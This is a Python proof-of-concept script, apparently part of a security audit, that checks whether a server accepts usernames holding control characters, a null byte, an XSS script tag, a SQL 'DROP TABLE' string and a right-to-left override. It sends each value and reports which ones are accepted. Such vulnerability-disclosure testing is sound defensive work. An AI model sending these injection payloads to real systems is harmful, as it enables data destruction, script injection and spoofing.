"""
PoC: Username accepts control characters and injection strings.

The server does not validate the content of usernames beyond length and
the 'clear-' prefix check. This allows setting usernames containing
newlines, tabs, null bytes, HTML, and Unicode direction overrides.

Run with: uv run python vulnerabilities/pocs/poc_username_injection.py
"""
import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from vulnerabilities.lib.probe import make_handle, connect_cleartext, send_recv

def try_set_username(sock, session, name, label):
    r = send_recv(sock, {
        'request_type': 13, 'session': session,
        'request_handle': make_handle(), 'username': name
    })
    success = r and r.get(b'response_type') == 34
    accepted = r.get(b'new_username', b'') if r else b''
    status = 'ACCEPTED' if success else 'REJECTED'
    print(f"  [{status}] {label}: {repr(name)}")
    if success:
        print(f"           Server stored as: {repr(accepted)}")
    return success

def main():
    sock, session, _ = connect_cleartext()
    print("Testing invalid username characters:\n")

    injections = [
        ('clear-\n',            'newline (log injection)'),
        ('clear-\r',            'carriage return'),
        ('clear-\t',            'tab'),
        ('clear-test\x00end',   'null byte in middle (null injection)'),
        ('clear-<script>alert(1)</script>', 'HTML/XSS injection'),
        ("clear-'; DROP TABLE users;--", 'SQL injection string'),
        ('clear-‮evil',    'right-to-left override (display spoofing)'),
    ]

    accepted = []
    for name, label in injections:
        if try_set_username(sock, session, name, label):
            accepted.append((name, label))

    print(f"\n{'='*60}")
    if accepted:
        print(f"VULNERABLE: {len(accepted)} injection strings accepted as usernames")
        for name, label in accepted:
            print(f"  - {label}: {repr(name)}")

        # Show display spoofing demo
        rtl = next((n for n, l in accepted if 'right-to-left' in l), None)
        if rtl:
            print(f"\nDisplay spoofing demo (right-to-left override):")
            print(f"  Stored username: {repr(rtl)}")
            print(f"  Terminal display: {rtl}")
            print(f"  (The text after ‮ is displayed right-to-left in most terminals)")
    else:
        print("Not vulnerable — all injections rejected")

    sock.close()

if __name__ == '__main__':
    main()
